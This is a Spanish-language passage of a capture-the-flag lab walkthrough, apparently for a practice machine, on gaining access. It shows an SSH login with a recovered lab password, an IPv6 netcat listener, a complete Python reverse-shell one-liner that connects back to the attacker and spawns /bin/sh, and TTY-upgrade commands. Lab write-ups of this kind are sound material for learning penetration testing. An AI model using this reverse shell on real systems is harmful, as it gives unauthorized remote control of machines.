## Vuln exploit & Gaining Access {-}

### Ganando acceso con ssh {-}

Como tenemos la contraseña del usuario loki, no connectamos a la maquina victima con 
ssh.

```bash
ssh loki@10.10.10.92
password: lokiisthebestnorsegod
```

y podemos visualizar la flag.

### Ganando acceso con ipv6 {-}

Tambien podriamos ganar acceso al systema por IPV6

1. Mirar con ifconfig nuestra ipv6
1. Ponernos en escucha por ipv6 con netcat

    ```bash
    nc -nv --listen dead:beef:2::101b 443
    ```

1. Entablar la reverse shell con python

    ```bash
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::101b",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    ```

Y de esta manera vemos que ganamos acceso a la maquina victima como *www-data*

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

